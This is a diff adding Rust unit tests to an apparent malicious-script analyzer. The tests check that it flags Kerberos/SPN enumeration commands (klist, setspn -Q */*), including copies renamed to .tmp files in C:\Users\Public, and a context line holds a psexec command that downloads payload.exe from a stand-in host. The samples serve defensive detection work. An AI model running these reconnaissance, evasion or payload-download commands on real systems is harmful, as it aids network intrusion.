@@ -4183,6 +4183,71 @@ C:\Users\Public\net.tmp share
     }
 
     #[test]
+    fn kerberos_spn_discovery_commands_emit_enumeration_traits() {
+        let report = analyze(
+            br#"klist tickets
+setspn -Q */*
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        for (kind, command) in [
+            ("klist", "klist tickets"),
+            ("setspn-query", "setspn -Q */*"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command: c }
+                        if enum_kind == kind && c == command
+                )),
+                "missing Kerberos/SPN enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn copied_kerberos_spn_aliases_emit_enumeration_traits() {
+        let script = br#"copy C:\Windows\System32\klist.exe C:\Users\Public\kl.tmp
+C:\Users\Public\kl.tmp sessions
+copy C:\Windows\System32\setspn.exe C:\Users\Public\sp.tmp
+C:\Users\Public\sp.tmp -Q */*
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for target in [r#"C:\Users\Public\kl.tmp"#, r#"C:\Users\Public\sp.tmp"#] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ManipulatedExec { target: t, .. }
+                        if t.eq_ignore_ascii_case(target)
+                )),
+                "copied Kerberos/SPN alias {target} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "klist" && command == "klist.exe sessions"
+            )),
+            "copied klist enumeration was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "setspn-query" && command == "setspn.exe -Q */*"
+            )),
+            "copied setspn query enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
